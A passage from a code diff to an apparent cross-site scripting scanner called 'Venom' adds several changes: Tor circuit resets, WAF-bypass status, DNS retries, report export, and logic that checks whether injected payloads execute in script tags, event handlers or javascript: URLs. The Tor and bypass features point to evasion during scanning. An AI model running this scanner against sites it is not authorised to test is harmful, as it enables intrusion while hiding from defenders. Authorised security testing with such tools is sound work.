+                    pass  # Queue might already be marked done
+                if self.args.use_tor and "NameResolutionError" in str(e):
+                    reset_tor_circuit()
 
     def display_status(self):
         while self.running:
@@ -692,7 +959,8 @@ class Venom:
 {BLUE}║{RESET} Tests Run: {YELLOW}{self.total_tests.get():>5}{RESET} | Payloads: {YELLOW}{self.total_payloads}{RESET} | Vulns: {RED}{len(self.vulnerabilities)}{RESET} | Speed: {GREEN}{tests_per_sec:.2f} t/s{RESET}
 {BLUE}║{RESET} Current: {CYAN}{self.current_method} {self.current_param}={self.current_payload}{RESET}
 {BLUE}║{RESET} Cookies: {WHITE}{self.current_cookie}{RESET}
-{BLUE}║{RESET} WAF/IPS: {ORANGE}{self.waf_ips_status}{RESET} | Workers: {PURPLE}{self.args.workers}{RESET} | Domain: {WHITE}{self.domain}{RESET}
+{BLUE}║{RESET} WAF/IPS: {ORANGE}{self.waf_ips_status} ({self.waf_type}){RESET} | Bypass: {GREEN}{'Active' if self.bypass_performed else 'Inactive'}{RESET}
+{BLUE}║{RESET} Workers: {PURPLE}{self.args.workers}{RESET} | Domain: {WHITE}{self.domain}{RESET} | DNS Fails: {YELLOW}{self.dns_failure_count}{RESET}
 {BLUE}╚════════════════════════════════════════════════════════════════════════════════════╝{RESET}
 """
                 print(status, end='\r' if os.name == 'nt' else '')
@@ -700,9 +968,24 @@ class Venom:
             time.sleep(0.1)
 
     def run(self):
+        dns_retries = 5
+        ip = None
+        for attempt in range(dns_retries):
+            ip = self.resolve_with_fallback(self.domain)
+            if ip:
+                print(f"{GREEN}[+] DNS resolution successful for {self.domain} on attempt {attempt + 1} (IP: {ip}).{RESET}")
+                break
+            else:
+                print(f"{YELLOW}[!] DNS resolution failed for {self.domain} on attempt {attempt + 1}/{dns_retries}. Retrying...{RESET}")
+                if self.args.use_tor:
+                    reset_tor_circuit()
+                time.sleep(2)
+        else:
+            print(f"{RED}[!] All DNS resolution attempts failed for {self.domain}. Exiting.{RESET}")
+            sys.exit(1)
+
         if not self.check_connection(self.args.url):
-            print(f"{RED}[!] Target URL {self.args.url} unreachable. Exiting.{RESET}")
-            return
+            print(f"{RED}[!] Target URL {self.args.url} unreachable after retries. Attempting scan anyway.{RESET}")
         
         urls = self.crawl_links(self.args.url)
         logging.info(f"Initial crawl found {len(urls)} URLs")
@@ -713,7 +996,6 @@ class Venom:
                 else:
                     logging.warning(f"Subdomain {subdomain} unreachable, skipping")
 
-        # Ensure base URL is tested even if crawl finds no additional URLs
         if self.args.method in ['get', 'both']:
             self.task_queue.put((self.args.url, 'get', {}))
             logging.debug(f"Queued GET task for {self.args.url}")
@@ -733,11 +1015,13 @@ class Venom:
         print(f"{GREEN}[+] Starting scan with {self.task_queue.qsize()} tasks queued{RESET}")
         
         status_thread = threading.Thread(target=self.display_status)
+        status_thread.daemon = True
         status_thread.start()
 
         workers = []
         for _ in range(self.args.workers):
             worker_thread = threading.Thread(target=self.worker)
+            worker_thread.daemon = True
             worker_thread.start()
             workers.append(worker_thread)
 
@@ -763,18 +1047,88 @@ class Venom:
                 print(f"{GREEN}║{RESET}    Method: {CYAN}{vuln['method']}{RESET}")
                 print(f"{GREEN}║{RESET}    Parameter: {YELLOW}{vuln['param']}{RESET}")
                 print(f"{GREEN}║{RESET}    Payload: {PURPLE}{vuln['payload']}{RESET}")
+                print(f"{GREEN}║{RESET}    Context: {ORANGE}{vuln['context']}{RESET}")
+                print(f"{GREEN}║{RESET}    Status Code: {YELLOW}{vuln['status_code']}{RESET}")
+                print(f"{GREEN}║{RESET}    Response Snippet: {WHITE}{vuln['response_snippet']}{RESET}")
         else:
             print(f"{GREEN}║{RESET}    {GREEN}No vulnerabilities detected.{RESET}")
         print(f"{GREEN}╚════════════════════════════════════════════════════════════════════╝{RESET}")
 
-def is_reflected(payload: str, response_text: str) -> bool:
+        if self.args.export_report:
+            self.export_report(self.args.export_report)
+
+    def export_report(self, filename: str):
+        try:
+            if filename.endswith('.json'):
+                with open(filename, 'w', encoding='utf-8') as f:
+                    json.dump({
+                        'target': self.args.url,
+                        'total_tests': self.total_tests.get(),
+                        'total_payloads': self.total_payloads,
+                        'duration': time.time() - self.start_time,
+                        'vulnerabilities': self.vulnerabilities
+                    }, f, indent=4, ensure_ascii=False)
+            elif filename.endswith('.csv'):
+                with open(filename, 'w', encoding='utf-8') as f:
+                    f.write("URL,Full URL,Method,Parameter,Payload,Type,Context,Status Code,Response Snippet\n")
+                    for vuln in self.vulnerabilities:
+                        f.write(f"{vuln['url']},{vuln['full_url']},{vuln['method']},{vuln['param']},\"{vuln['payload']}\",{vuln['type']},{vuln['context']},{vuln['status_code']},\"{vuln['response_snippet']}\"\n")
+            logging.info(f"Report exported to {filename}")
+        except Exception as e:
+            logging.error(f"Failed to export report to {filename}: {e}")
+
+def is_reflected(payload: str, response_text: str, soup: BeautifulSoup) -> tuple[bool, str]:
     if not payload.strip():
-        return False
-    patterns = [payload, payload.lower(), html.escape(payload)]
-    for pattern in patterns:
-        if pattern in response_text:
-            return True
-    return False
+        return False, "Empty payload"
+
+    # Check for full payload reflection first
+    if payload in response_text and html.escape(payload) != payload:
+        # Check executable contexts
+        script_tags = soup.find_all('script')
+        for script in script_tags:
+            script_text = script.get_text()
+            if payload in script_text and not script.get('src'):  # Ignore <script src="...">
+                return True, "Inside <script> tag (executable)"
+
+        for tag in soup.find_all(True):
+            for attr, value in tag.attrs.items():
+                if attr.startswith('on') and payload in str(value):
+                    return True, f"Inside event handler ({attr})"
+                elif attr in ['href', 'src', 'data'] and 'javascript:' in value.lower() and payload in value:
+                    return True, f"Inside {attr} attribute (javascript:)"
+
+        # Check for unescaped HTML injection
+        if any(c in payload for c in '<>"\'') and payload in response_text:
+            return True, "Unescaped in HTML"
+
+        logging.debug(f"Payload '{payload}' found but not in executable context")
+        return False, "Reflected but not executable"
+
+    # Check for significant executable portions (e.g., alert(), javascript:)
+    executable_patterns = [
+        r'alert\(.+\)', r'javascript:[^"]+', r'on[a-z]+\s*=\s*["\'][^"\']+["\']'
+    ]
+    for pattern in executable_patterns:
+        matches = re.findall(pattern, payload, re.IGNORECASE)
+        for match in matches:
+            if match in response_text and html.escape(match) != match:
+                script_tags = soup.find_all('script')
+                for script in script_tags:
+                    if match in script.get_text() and not script.get('src'):
+                        return True, "Inside <script> tag (executable portion)"
+                for tag in soup.find_all(True):
+                    for attr, value in tag.attrs.items():
+                        if attr.startswith('on') and match in str(value):
+                            return True, f"Inside event handler ({attr}) (executable portion)"
+                        elif attr in ['href', 'src', 'data'] and 'javascript:' in value.lower() and match in value:
+                            return True, f"Inside {attr} attribute (javascript:) (executable portion)"
+                if any(c in match for c in '<>"\'') and match in response_text:
+                    return True, "Unescaped in HTML (executable portion)"
+                logging.debug(f"Executable portion '{match}' found but not in executable context")
+                return False, "Executable portion reflected but not executable"
+
+    logging.debug(f"Payload '{payload}' not reflected or not executable")
+    return False, "Not reflected or not executable"
 
 if __name__ == "__main__":
     args = parse_args()
